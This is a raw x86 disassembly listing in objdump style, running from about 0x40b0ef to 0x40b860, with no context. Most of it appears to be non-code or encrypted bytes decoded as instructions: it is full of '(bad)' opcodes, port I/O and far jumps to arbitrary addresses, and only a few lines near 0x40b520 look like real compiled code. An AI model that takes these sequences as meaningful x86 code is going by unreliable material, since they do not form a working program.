  40b0ef:	cmp    DWORD PTR [ebx],0x6d
  40b0f2:	scas   al,BYTE PTR es:[edi]
  40b0f3:	fisttp QWORD PTR ds:0x42603905
  40b0f9:	scas   eax,DWORD PTR es:[edi]
  40b0fa:	cs push ds
  40b0fc:	dec    ebp
  40b0fd:	dec    esi
  40b0fe:	fisubr DWORD PTR [eax]
  40b100:	mov    WORD PTR [edx],es
  40b102:	pusha  
  40b103:	leave  
  40b104:	xchg   ebp,eax
  40b105:	cmp    DWORD PTR [ecx+0x35],esi
  40b108:	sbb    ah,dl
  40b10a:	mov    bh,0x3e
  40b10c:	sub    DWORD PTR ds:0x430a84cf,ebp
  40b112:	lahf   
  40b113:	bound  eax,QWORD PTR [esi+0x79]
  40b116:	pop    ecx
  40b117:	pusha  
  40b118:	cmp    ebx,DWORD PTR [ebp-0x20]
  40b11b:	mov    DWORD PTR [ebx+0x33],esp
  40b11e:	adc    al,0xc2
  40b120:	dec    ecx
  40b121:	pop    es
  40b122:	cwde   
  40b123:	mov    edx,0xa100edd0
  40b128:	out    0xd7,al
  40b12a:	ret    
  40b12b:	stos   BYTE PTR es:[edi],al
  40b12c:	stc    
  40b12d:	rcr    BYTE PTR [ebp-0x63],cl
  40b130:	mov    ebp,0x1f35a7e
  40b135:	xor    DWORD PTR [eax],edx
  40b137:	inc    esi
  40b138:	jmp    0x5d08:0x4a655ff
  40b13f:	in     eax,0x5c
  40b141:	scas   eax,DWORD PTR es:[edi]
  40b142:	or     esp,DWORD PTR [ebx-0x3d]
  40b145:	cmc    
  40b146:	js     0x40b13f
  40b148:	cld    
  40b149:	pop    eax
  40b14a:	xchg   DWORD PTR [edi+eax*2-0x22],ecx
  40b14e:	push   cs
  40b14f:	nop
  40b150:	shl    BYTE PTR [esp+ebp*4-0x1f],cl
  40b154:	lds    edi,FWORD PTR [eax]
  40b156:	pop    esp
  40b157:	out    0x5c,al
  40b159:	jle    0x40b181
  40b15b:	js     0x40b125
  40b15d:	sbb    al,0xaa
  40b15f:	jecxz  0x40b164
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	mov    ebx,0xa2461fd6
  40b178:	cli    
  40b179:	jo     0x40b1eb
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b121
  40b180:	addr16 xchg ebp,eax
  40b182:	mov    dl,0x7f
  40b184:	imul   esi,DWORD PTR [ebp-0x605911ab],0xf8a091a2
  40b18e:	adc    eax,0x1e2b9885
  40b193:	and    edi,DWORD PTR ds:0x84bd5926
  40b199:	push   ds
  40b19a:	cld    
  40b19b:	or     edx,ebx
  40b19d:	xor    ebx,DWORD PTR [edx+0x50f32fb1]
  40b1a3:	fs add al,0x34
  40b1a6:	adc    al,0x34
  40b1a8:	push   esi
  40b1a9:	push   0xffffff84
  40b1ab:	jns    0x40b204
  40b1ad:	cmp    eax,0x517651fc
  40b1b2:	xor    DWORD PTR [ebp+0xd],ebp
  40b1b5:	outs   dx,BYTE PTR ds:[esi]
  40b1b6:	and    ah,BYTE PTR [eax-0x174829ac]
  40b1bc:	pop    ds
  40b1bd:	retf   
  40b1be:	data16 aad 0x34
  40b1c1:	cmp    al,0x10
  40b1c3:	mov    BYTE PTR [edx-0x7a],bh
  40b1c6:	retf   0xdec7
  40b1c9:	dec    ebp
  40b1ca:	sbb    eax,0x9c59712a
  40b1cf:	imul   ecx,DWORD PTR [ebx],0x5f5586c8
  40b1d5:	daa    
  40b1d6:	sub    al,0x6b
  40b1d8:	jmp    0x19570db8
  40b1dd:	jae    0x40b23d
  40b1df:	adc    ebp,edi
  40b1e1:	(bad)  
  40b1e2:	iret   
  40b1e3:	fwait
  40b1e4:	loopne 0x40b256
  40b1e6:	dec    ebx
  40b1e7:	mov    eax,ds:0x4b8f9427
  40b1ec:	pop    ebp
  40b1ed:	xor    esi,DWORD PTR [eax-0x77]
  40b1f0:	inc    ebx
  40b1f1:	xchg   esp,eax
  40b1f2:	mov    eax,ds:0x5a05f18f
  40b1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f8:	or     ebp,edx
  40b1fa:	sahf   
  40b1fb:	imul   esi,eax,0xffffffc8
  40b1fe:	dec    eax
  40b200:	push   esp
  40b201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b202:	pop    edx
  40b203:	xchg   esp,eax
  40b204:	aas    
  40b205:	shr    BYTE PTR [eax+ebp*2],1
  40b208:	jo     0x40b279
  40b20a:	ja     0x40b192
  40b20c:	fdivrp st(6),st
  40b20e:	cmc    
  40b20f:	(bad)  
  40b210:	daa    
  40b211:	mov    edi,0x164b88a
  40b216:	in     eax,0xd0
  40b218:	lahf   
  40b219:	sbb    DWORD PTR [ebp-0x362e6ed],ecx
  40b21f:	dec    edx
  40b220:	dec    edi
  40b221:	out    0x17,eax
  40b223:	mov    dh,0xe0
  40b225:	test   al,0x20
  40b227:	or     DWORD PTR [ecx+0x7a],esp
  40b22a:	or     eax,0xcb530cfc
  40b22f:	push   ebx
  40b230:	repz dec edx
  40b232:	jo     0x40b212
  40b234:	sbb    ebp,esp
  40b236:	pop    es
  40b237:	aam    0x6e
  40b239:	(bad)  
  40b23a:	cs adc al,0xba
  40b23d:	push   edi
  40b23e:	pusha  
  40b23f:	shl    DWORD PTR [ebp+0x5d],0x79
  40b243:	lea    eax,[eax+0x7e58e5e3]
  40b249:	js     0x40b223
  40b24b:	leave  
  40b24c:	gs dec edx
  40b24e:	jmp    0x40b1da
  40b250:	inc    esp
  40b251:	fdivr  QWORD PTR [edx+0x5c]
  40b254:	lea    esp,[ebp-0x14]
  40b257:	sti    
  40b258:	pop    ss
  40b259:	or     edx,DWORD PTR [edx+0x48243963]
  40b25f:	lds    ebx,FWORD PTR [edx+esi*4-0x5a065390]
  40b266:	outs   dx,BYTE PTR ds:[esi]
  40b267:	xchg   ecx,eax
  40b268:	(bad)  
  40b269:	mov    ebx,0xc5c8b552
  40b26e:	jno    0x40b25a
  40b270:	jo     0x40b252
  40b272:	call   0x2dbd:0x89d20843
  40b279:	mov    ecx,0x5af1b978
  40b27e:	mov    ch,0x2a
  40b280:	mov    esp,0xc5438b56
  40b285:	inc    di
  40b287:	in     eax,0x3c
  40b289:	sbb    DWORD PTR [ecx+0x13d20c54],eax
  40b28f:	jge    0x40b2b3
  40b291:	out    dx,eax
  40b292:	gs hlt 
  40b294:	daa    
  40b295:	arpl   WORD PTR [ebp+0x70],di
  40b298:	or     al,0x64
  40b29a:	je     0x40b233
  40b29c:	jns    0x40b310
  40b29e:	leave  
  40b29f:	lods   eax,DWORD PTR ds:[esi]
  40b2a0:	sub    BYTE PTR [edx+0x7f],ah
  40b2a3:	dec    esp
  40b2a4:	mov    edi,0x2f9535aa
  40b2a9:	test   al,0x95
  40b2ab:	inc    eax
  40b2ac:	(bad)  
  40b2ad:	push   cs
  40b2ae:	cmp    eax,0x80ca8fdf
  40b2b3:	lods   al,BYTE PTR ds:[esi]
  40b2b4:	push   esi
  40b2b5:	lds    esp,FWORD PTR [edi]
  40b2b7:	mov    ecx,0x58f91a8b
  40b2bc:	and    bl,BYTE PTR [ebx]
  40b2be:	mov    dl,0x7d
  40b2c0:	cmp    ecx,0x7f97c029
  40b2c6:	mov    esp,0x21afa7e8
  40b2cb:	leave  
  40b2cc:	xchg   eax,esi
  40b2ce:	ret    
  40b2cf:	ss xchg ebx,eax
  40b2d1:	dec    eax
  40b2d2:	mov    al,cl
  40b2d4:	out    0x66,eax
  40b2d6:	jo     0x40b26c
  40b2d8:	not    BYTE PTR [eax+edx*8-0x71]
  40b2dc:	into   
  40b2dd:	mov    al,0xa
  40b2df:	or     al,0xa8
  40b2e1:	mov    ebp,DWORD PTR [esi+0x4c]
  40b2e4:	jge    0x40b311
  40b2e6:	(bad)  
  40b2e7:	xchg   esp,eax
  40b2e8:	dec    esp
  40b2e9:	icebp  
  40b2ea:	mov    al,ds:0xedf1e2ff
  40b2ef:	out    dx,al
  40b2f0:	call   0x41c7:0x4b3460fa
  40b2f7:	add    edx,ebx
  40b2f9:	add    al,0x2a
  40b2fb:	cmc    
  40b2fc:	adc    edx,DWORD PTR [ebx+eiz*8-0x11dbb4b8]
  40b303:	jmp    0x40b2d3
  40b305:	mov    ebx,0x313ce5f1
  40b30a:	into   
  40b30b:	arpl   si,cx
  40b30d:	inc    esi
  40b30e:	pop    esp
  40b30f:	sub    al,0xab
  40b311:	lds    eax,FWORD PTR [edi]
  40b313:	jp     0x40b2e8
  40b315:	idiv   BYTE PTR [eax-0x7f]
  40b318:	push   ds
  40b319:	sti    
  40b31a:	pop    esi
  40b31b:	int    0xff
  40b31d:	or     al,0xd7
  40b31f:	mov    al,BYTE PTR ds:0xac98f4d
  40b325:	scas   eax,DWORD PTR es:[edi]
  40b326:	in     eax,dx
  40b327:	rcl    BYTE PTR [eax],cl
  40b329:	mov    eax,0x264291d1
  40b32e:	push   edx
  40b32f:	mov    ch,0x84
  40b331:	leave  
  40b332:	xor    ecx,ecx
  40b334:	ins    BYTE PTR es:[edi],dx
  40b335:	call   0xacee:0xba6ca06b
  40b33c:	(bad)  
  40b33d:	mov    ebx,0xbc52e375
  40b342:	loopne 0x40b383
  40b344:	out    0x40,eax
  40b346:	xor    ch,BYTE PTR [edx+esi*4-0x799e2913]
  40b34d:	cwde   
  40b34e:	fnsave [ebp-0x24]
  40b351:	sar    BYTE PTR [ecx],cl
  40b353:	scas   eax,DWORD PTR es:[edi]
  40b354:	mov    cl,0xda
  40b356:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40b358:	push   edi
  40b359:	(bad)  
  40b35a:	ret    
  40b35b:	sbb    al,0x24
  40b35d:	mov    esp,0xe40efcbb
  40b362:	mov    eax,0x59931f35
  40b367:	loop   0x40b395
  40b369:	add    DWORD PTR [edx],esi
  40b36b:	add    al,0xb5
  40b36d:	leave  
  40b36e:	push   ebp
  40b36f:	cmp    ecx,DWORD PTR [ecx]
  40b371:	lods   eax,DWORD PTR ds:[esi]
  40b372:	daa    
  40b373:	and    eax,0x58c0a058
  40b378:	aaa    
  40b379:	xchg   dl,bl
  40b37b:	imul   ecx,DWORD PTR [edx-0x5d],0x2b3bc4a7
  40b382:	cld    
  40b383:	sbb    ah,ch
  40b385:	push   ebp
  40b386:	inc    ecx
  40b387:	aad    0x76
  40b389:	rcl    DWORD PTR [esi-0x228d7794],0xca
  40b390:	mov    ecx,0xc0bec5d6
  40b395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b396:	out    dx,al
  40b397:	retf   
  40b398:	xor    eax,0x7a982669
  40b39d:	adc    BYTE PTR [edi-0x4eb91996],bl
  40b3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3a4:	stc    
  40b3a5:	not    DWORD PTR [eax*1-0x6357748]
  40b3ac:	mov    al,0xdc
  40b3ae:	adc    al,0xe9
  40b3b0:	(bad)  
  40b3b1:	ror    DWORD PTR [eax],1
  40b3b3:	and    DWORD PTR [edx+0x33f110d1],ebp
  40b3b9:	mov    eax,ds:0x7416f5b0
  40b3be:	xchg   edi,eax
  40b3bf:	outs   dx,DWORD PTR ds:[esi]
  40b3c0:	mov    cl,al
  40b3c2:	arpl   cx,di
  40b3c4:	pop    ecx
  40b3c5:	popa   
  40b3c6:	sbb    DWORD PTR [eax+0x75],edi
  40b3c9:	cwde   
  40b3ca:	jge    0x40b3f0
  40b3cc:	ja     0x40b42b
  40b3ce:	ss inc ecx
  40b3d0:	mov    esi,0x936e2b6
  40b3d5:	or     bl,BYTE PTR [esi-0x10]
  40b3d8:	mov    ebp,0x866c347
  40b3dd:	adc    al,0x32
  40b3df:	int3   
  40b3e0:	enter  0x6bd0,0x8f
  40b3e4:	ins    BYTE PTR es:[edi],dx
  40b3e5:	mov    al,ds:0x856dc5c1
  40b3ea:	mov    dh,0x50
  40b3ec:	in     al,dx
  40b3ed:	xchg   ebp,eax
  40b3ee:	loope  0x40b450
  40b3f0:	jmp    0x2bff72e1
  40b3f5:	sbb    eax,0xa29ca52b
  40b3fa:	sub    esp,DWORD PTR [edx+ebx*2+0x18e0328d]
  40b401:	cli    
  40b402:	jmp    0x40b422
  40b404:	fistp  DWORD PTR [esi]
  40b406:	adc    BYTE PTR [ebp-0x5fed11da],ch
  40b40c:	scas   eax,DWORD PTR es:[edi]
  40b40d:	imul   eax,DWORD PTR [ebp+0x11da88de],0xffffffcd
  40b414:	add    ah,ah
  40b416:	sub    BYTE PTR [eax+0x79],dl
  40b419:	mov    esi,0x8b6e459f
  40b41e:	(bad)  
  40b41f:	aam    0x8c
  40b421:	lock repnz adc eax,0x1e3c724d
  40b428:	sub    DWORD PTR [edx],0x2b
  40b42b:	in     eax,dx
  40b42c:	push   ss
  40b42d:	das    
  40b42e:	and    ecx,eax
  40b430:	dec    edi
  40b431:	(bad)  
  40b432:	retf   0x524b
  40b435:	adc    ch,BYTE PTR [ebp+0x4a]
  40b438:	stos   BYTE PTR es:[edi],al
  40b439:	lods   al,BYTE PTR ds:[esi]
  40b43a:	or     eax,0xea8501b8
  40b43f:	cli    
  40b440:	nop
  40b441:	fs and ax,0x9402
  40b446:	in     eax,0x6
  40b448:	mov    ds:0x285c4141,eax
  40b44d:	nop
  40b44e:	jmp    0x40b3ec
  40b450:	and    eax,DWORD PTR [eiz*1+0x4c85c41e]
  40b457:	into   
  40b458:	xor    eax,0xd9b17cb1
  40b45d:	add    BYTE PTR [eax],al
  40b45f:	lds    esi,FWORD PTR [edx]
  40b461:	mov    esp,0x17169b22
  40b466:	jno    0x40b456
  40b468:	adc    eax,0x7f0984d7
  40b46d:	cdq    
  40b46e:	fst    DWORD PTR [esi]
  40b470:	adc    al,0xd9
  40b472:	rol    esp,1
  40b474:	mov    edx,0x6194c8c5
  40b479:	cmp    DWORD PTR [ebx+ebp*1-0x20d97c48],0x7d6efe8a
  40b484:	cmc    
  40b485:	and    BYTE PTR [edx-0x502e3a09],al
  40b48b:	add    ecx,eax
  40b48d:	out    dx,eax
  40b48e:	sub    al,0x79
  40b490:	out    0x62,al
  40b492:	and    al,0x1
  40b494:	lods   al,BYTE PTR ds:[esi]
  40b495:	or     DWORD PTR [edx-0x50],0x7beb3dc4
  40b49c:	scas   eax,DWORD PTR es:[edi]
  40b49d:	fiadd  WORD PTR [esp+edi*4+0x402eccfd]
  40b4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a5:	pushf  
  40b4a6:	pop    ebx
  40b4a7:	icebp  
  40b4a8:	(bad)  
  40b4a9:	fbld   TBYTE PTR [ecx-0x42e52b2f]
  40b4af:	inc    eax
  40b4b0:	sbb    ah,dh
  40b4b2:	rcl    BYTE PTR [ecx*2+0x254e7f4c],cl
  40b4b9:	sbb    al,0x89
  40b4bb:	sub    BYTE PTR [eax+ecx*4+0x3a],0x1e
  40b4c0:	pop    ds
  40b4c1:	nop
  40b4c2:	rcl    BYTE PTR [edi+0x6df0f5c7],cl
  40b4c8:	jle    0x40b4fa
  40b4ca:	pop    es
  40b4cb:	lock ja 0x40b4d7
  40b4ce:	fucomip st,st(4)
  40b4d0:	ret    
  40b4d1:	repnz adc ecx,DWORD PTR [ebx-0x49ead098]
  40b4d8:	mov    ebx,DWORD PTR [eax]
  40b4da:	aad    0x9c
  40b4dc:	fistp  WORD PTR [ecx+0x79cb1b32]
  40b4e2:	ja     0x40b4de
  40b4e4:	dec    ebp
  40b4e5:	xor    al,0xfb
  40b4e7:	ins    BYTE PTR es:[edi],dx
  40b4e8:	xchg   esp,eax
  40b4e9:	inc    esi
  40b4ea:	ss inc edx
  40b4ec:	mov    DWORD PTR [edi+0x66acb073],0xbf2603b5
  40b4f6:	cs pop ss
  40b4f8:	sbb    BYTE PTR [ebx+0x6ca6207],dh
  40b4fe:	ret    
  40b4ff:	push   edi
  40b500:	cli    
  40b501:	dec    ecx
  40b502:	in     eax,dx
  40b503:	mov    ch,0xb6
  40b505:	sub    esp,DWORD PTR [edi-0x25]
  40b508:	xor    al,0x15
  40b50a:	fwait
  40b50b:	push   esi
  40b50c:	cmp    bh,ah
  40b50e:	and    BYTE PTR [ecx],bh
  40b510:	inc    edi
  40b511:	bound  esp,QWORD PTR [ebp-0x26986e46]
  40b517:	sar    DWORD PTR [edi-0xc13b274],0x0
  40b51e:	xor    DWORD PTR [edx],esi
  40b520:	imul   edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	cwde   
  40b550:	adc    al,0x99
  40b552:	adc    ecx,eax
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b54b
  40b55c:	mov    al,0x23
  40b55e:	xor    DWORD PTR [ebp+0x7f770b07],0x58
  40b565:	jns    0x40b4f0
  40b567:	or     BYTE PTR [ebx+ecx*1-0x6a782179],al
  40b56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b56f:	pushf  
  40b570:	fs push cs
  40b572:	arpl   WORD PTR [ebx+0x70],dx
  40b575:	adc    eax,0x9e43f2fd
  40b57a:	mov    edi,0xf5e18a23
  40b57f:	iret   
  40b580:	in     eax,dx
  40b581:	(bad)  
  40b582:	push   esi
  40b583:	mov    cl,0xac
  40b585:	adc    dl,BYTE PTR [edx+0x7c01d688]
  40b58b:	ret    
  40b58c:	ret    0x6118
  40b58f:	push   edx
  40b590:	call   0xdb82:0xcc809386
  40b597:	jmp    0x40b574
  40b599:	cdq    
  40b59a:	xchg   edi,eax
  40b59b:	gs call 0x3b671c84
  40b5a1:	lahf   
  40b5a2:	lock mov fs,WORD PTR [eax-0x69]
  40b5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a7:	stos   BYTE PTR es:[edi],al
  40b5a8:	mov    dl,0xa3
  40b5aa:	js     0x40b59c
  40b5ac:	ret    
  40b5ad:	int    0x4d
  40b5af:	dec    ebx
  40b5b0:	in     eax,0x2d
  40b5b2:	cmp    al,0x5b
  40b5b4:	inc    esp
  40b5b5:	scas   al,BYTE PTR es:[edi]
  40b5b6:	in     eax,0xae
  40b5b8:	jmp    0x40b612
  40b5ba:	idiv   DWORD PTR [edi+ecx*1+0x1fc3b48a]
  40b5c1:	jmp    DWORD PTR [edx-0x25]
  40b5c4:	inc    ebx
  40b5c5:	adc    eax,0xff84e96c
  40b5ca:	pop    ebx
  40b5cb:	dec    edi
  40b5cc:	ja     0x40b63a
  40b5ce:	cmp    DWORD PTR [ebp+ebx*4-0x28],ebx
  40b5d2:	push   ebx
  40b5d3:	int3   
  40b5d4:	pop    ebx
  40b5d5:	in     al,0xd7
  40b5d7:	out    0xf9,al
  40b5d9:	inc    ebx
  40b5da:	(bad)  
  40b5db:	mov    bl,0x84
  40b5dd:	mov    ecx,0x2b814419
  40b5e2:	addr16 xchg ebp,eax
  40b5e4:	dec    esp
  40b5e5:	push   es
  40b5e6:	stc    
  40b5e7:	pop    ecx
  40b5e8:	jno    0x40b574
  40b5ea:	call   0x7683:0xba9a163c
  40b5f1:	enter  0x466f,0x33
  40b5f5:	cmp    eax,0x4d4bc972
  40b5fa:	sbb    BYTE PTR [edx+eiz*8],dl
  40b5fd:	repnz scas eax,DWORD PTR es:[edi]
  40b5ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b600:	jmp    DWORD PTR [ebx-0xdb9e49]
  40b606:	xor    BYTE PTR [eax-0x5d],ah
  40b609:	inc    esi
  40b60a:	xchg   esi,eax
  40b60b:	dec    esp
  40b60c:	jmp    0xcce2ac5e
  40b611:	adc    DWORD PTR [ebx-0x2ff86216],eax
  40b617:	push   edi
  40b618:	inc    esp
  40b619:	call   0xc6c7:0x35d7740c
  40b620:	pop    ebx
  40b621:	mov    ah,0x1a
  40b623:	dec    edx
  40b624:	aad    0xf8
  40b626:	jbe    0x40b5c9
  40b628:	pop    ecx
  40b629:	lds    ebx,FWORD PTR [esi]
  40b62b:	push   ebx
  40b62c:	or     eax,0xf12c4c51
  40b631:	ds sti 
  40b633:	nop
  40b634:	dec    eax
  40b635:	aas    
  40b636:	cmp    eax,DWORD PTR ds:0xb6c3c00a
  40b63c:	xchg   edx,eax
  40b63d:	jmp    0x40b634
  40b63f:	shl    DWORD PTR [esp+eiz*4-0x505f2376],cl
  40b646:	call   0x6f7866d5
  40b64b:	mov    bh,0xda
  40b64d:	mov    dh,0x8b
  40b64f:	mov    dh,0x30
  40b651:	neg    DWORD PTR [esi+eax*1]
  40b654:	call   0xabc8:0x4d7df014
  40b65b:	mov    dl,0x28
  40b65d:	daa    
  40b65e:	ins    DWORD PTR es:[edi],dx
  40b65f:	ror    DWORD PTR [ecx-0x11f24e91],cl
  40b665:	push   es
  40b666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b667:	aad    0xd5
  40b669:	jg     0x40b6c0
  40b66b:	jl     0x40b60a
  40b66d:	inc    ecx
  40b66e:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b670:	fstp   TBYTE PTR [ecx+edx*8]
  40b673:	dec    ebx
  40b674:	and    al,0x72
  40b676:	push   ds
  40b677:	and    eax,0xa836241e
  40b67c:	push   esp
  40b67d:	mov    eax,fs
  40b67f:	imul   eax,DWORD PTR [edi-0x11],0xffffffc8
  40b683:	dec    esi
  40b684:	mov    dl,0x85
  40b686:	(bad)  
  40b687:	repz xlat BYTE PTR ds:[ebx]
  40b689:	sub    eax,0xd77ca288
  40b68e:	call   0xef36ec43
  40b693:	(bad)  
  40b694:	or     cl,dl
  40b696:	jns    0x40b67d
  40b698:	dec    esi
  40b699:	ins    DWORD PTR es:[edi],dx
  40b69a:	jnp    0x40b634
  40b69c:	cmp    al,0x94
  40b69e:	sbb    eax,0x15c5730c
  40b6a3:	bound  ebx,QWORD PTR [ecx-0x84e5e07]
  40b6a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6aa:	shl    BYTE PTR [ebx],1
  40b6ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6ad:	jnp    0x40b721
  40b6af:	ss into 
  40b6b1:	mov    ds:0x3123f9b2,eax
  40b6b6:	xchg   esi,eax
  40b6b7:	jl     0x40b686
  40b6b9:	int    0x2
  40b6bb:	in     al,0x0
  40b6bd:	lock mov ds:0xd3fb653d,eax
  40b6c3:	std    
  40b6c4:	retf   0xe3e5
  40b6c7:	cmp    dl,ch
  40b6c9:	adc    al,0x7e
  40b6cb:	into   
  40b6cc:	(bad)  
  40b6cd:	adc    eax,0x879152b3
  40b6d2:	(bad)  
  40b6d3:	pop    ebp
  40b6d4:	jno    0x40b69a
  40b6d6:	push   edi
  40b6d7:	xchg   esp,eax
  40b6d8:	mov    ?,WORD PTR [eax+ebp*1+0x25]
  40b6dc:	mov    edx,0xd0492c13
  40b6e1:	cmp    al,BYTE PTR [esi]
  40b6e3:	sar    dh,cl
  40b6e5:	retf   0xd6bd
  40b6e8:	push   ss
  40b6e9:	lods   eax,DWORD PTR ds:[esi]
  40b6ea:	inc    ebx
  40b6eb:	mov    ecx,?
  40b6ed:	(bad)  [ebp+0xa724fdc]
  40b6f3:	clc    
  40b6f4:	iret   
  40b6f5:	pop    edx
  40b6f6:	or     al,0xa8
  40b6f8:	idiv   BYTE PTR [eax-0x3c01c6db]
  40b6fe:	ins    BYTE PTR es:[edi],dx
  40b6ff:	scas   al,BYTE PTR es:[edi]
  40b700:	cmp    edi,ebx
  40b702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b703:	data16 sahf 
  40b705:	and    eax,0xad132904
  40b70a:	mov    dl,0xc4
  40b70c:	in     eax,dx
  40b70d:	sbb    bl,BYTE PTR [eax+0x3db7b6d9]
  40b713:	xchg   esi,eax
  40b714:	outs   dx,DWORD PTR ds:[esi]
  40b715:	scas   al,BYTE PTR es:[edi]
  40b716:	mov    eax,0xb908812d
  40b71b:	imul   edx,DWORD PTR [ebp+0x51],0x2a32b6bb
  40b722:	sub    bh,BYTE PTR [edi+edx*4-0x47]
  40b726:	in     al,dx
  40b727:	in     al,dx
  40b728:	add    bl,BYTE PTR [ecx+0x1bb0cf7c]
  40b72e:	data16 rcl BYTE PTR [edx],0x4a
  40b732:	out    dx,eax
  40b733:	clc    
  40b734:	xlat   BYTE PTR ds:[ebx]
  40b735:	cld    
  40b736:	inc    ebx
  40b737:	pop    ds
  40b738:	(bad)  
  40b739:	fisub  DWORD PTR [edi-0x4d69016d]
  40b73f:	imul   edx,DWORD PTR ds:[edx+0x1b],0x44317672
  40b747:	lahf   
  40b748:	out    0x3d,al
  40b74a:	addr16 leave 
  40b74c:	ins    BYTE PTR es:[edi],dx
  40b74d:	dec    ebx
  40b74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b74f:	loope  0x40b6f9
  40b751:	lahf   
  40b752:	jecxz  0x40b721
  40b754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b756:	jns    0x40b75e
  40b758:	push   ss
  40b759:	enter  0x413f,0xd6
  40b75d:	jle    0x40b721
  40b75f:	sub    BYTE PTR [ebx+0x6cf773ee],al
  40b765:	sub    esi,ecx
  40b767:	aam    0xb
  40b769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76a:	jle    0x40b7c0
  40b76c:	(bad)  
  40b76e:	in     al,0x2b
  40b770:	xor    esp,DWORD PTR [ebp-0x785a1686]
  40b776:	pop    ebp
  40b777:	ins    BYTE PTR es:[edi],dx
  40b778:	and    eax,0xe6f83672
  40b77d:	test   DWORD PTR [edi],0xb942b4ff
  40b783:	or     BYTE PTR [esi-0xad08bba],cl
  40b789:	and    eax,0x7e10a562
  40b78e:	das    
  40b78f:	mov    eax,ds:0x4d21ea81
  40b794:	jecxz  0x40b76d
  40b796:	icebp  
  40b797:	aad    0x41
  40b799:	pop    ss
  40b79a:	idiv   BYTE PTR ds:0xa826fe7a
  40b7a0:	in     eax,0xcd
  40b7a2:	xlat   BYTE PTR ds:[ebx]
  40b7a3:	aad    0x9b
  40b7a5:	mov    ebx,0xb928fce1
  40b7aa:	mov    al,ds:0xe59e8871
  40b7af:	mov    ecx,0x3bb982ed
  40b7b4:	mov    eax,0xe689d83c
  40b7b9:	add    al,bh
  40b7bb:	sbb    al,0x98
  40b7bd:	into   
  40b7be:	(bad)
  40b7c2:	out    dx,al
  40b7c3:	cmp    BYTE PTR [edi+0x7f5bb4fa],al
  40b7c9:	shl    BYTE PTR [esi],cl
  40b7cb:	arpl   WORD PTR [ebx+0xe],ax
  40b7ce:	repnz pusha 
  40b7d0:	(bad)  
  40b7d1:	mov    ebp,0xe010c20c
  40b7d6:	repz push esi
  40b7d8:	shl    BYTE PTR [eax+0x1e],0x62
  40b7dc:	push   edx
  40b7dd:	inc    BYTE PTR [ebx]
  40b7df:	push   cs
  40b7e0:	clc    
  40b7e1:	mov    eax,0xd4e16484
  40b7e6:	cmp    BYTE PTR [edx],ah
  40b7e8:	xlat   BYTE PTR ds:[ebx]
  40b7e9:	std    
  40b7ea:	fiadd  WORD PTR [esi+0x605ccdf4]
  40b7f0:	ins    DWORD PTR es:[edi],dx
  40b7f1:	sub    edi,DWORD PTR [eax+0x308ecc5f]
  40b7f7:	mov    ds:0x80fefd76,eax
  40b7fc:	pop    eax
  40b7fd:	stos   BYTE PTR es:[edi],al
  40b7fe:	xchg   edi,eax
  40b7ff:	sar    dl,cl
  40b801:	int3   
  40b802:	cs pop ebx
  40b804:	adc    eax,0x7fe92917
  40b809:	fiadd  WORD PTR [eax-0x4f]
  40b80c:	push   es
  40b80d:	xchg   ebx,eax
  40b80e:	xchg   DWORD PTR [eax],esp
  40b810:	cmp    DWORD PTR [edi+0x20],ebx
  40b813:	imul   edx,DWORD PTR [eax-0x80],0x9a0eb55
  40b81a:	adc    al,0x79
  40b81c:	fistp  DWORD PTR [ebp-0x1f6b97f0]
  40b822:	sub    edx,DWORD PTR [eax+0x3b758685]
  40b828:	(bad)  
  40b829:	cld    
  40b82a:	int    0xe3
  40b82c:	cld    
  40b82d:	xor    al,0x23
  40b82f:	mov    dh,0x97
  40b831:	mov    esi,0x40148fb6
  40b836:	xchg   ecx,eax
  40b837:	and    cl,BYTE PTR [esi+0x2f73db0a]
  40b83d:	sti    
  40b83e:	in     eax,0xfb
  40b840:	and    BYTE PTR ds:0xfcc01dde,0xcd
  40b847:	stos   DWORD PTR es:[edi],eax
  40b848:	xor    DWORD PTR [edi+ecx*2],ebp
  40b84b:	jne    0x40b8c9
  40b84d:	mov    ecx,gs
  40b84f:	les    esi,FWORD PTR [esi]
  40b851:	lahf   
  40b852:	shl    DWORD PTR [edi-0x13],1
  40b855:	jl     0x40b8a3
  40b857:	sub    eax,0xf458fb6c
  40b85c:	pop    ds
  40b85d:	mov    cl,0xde
  40b85f:	push   eax
  40b860:	sbb    DWORD PTR [esi+0x2c481c94],edx
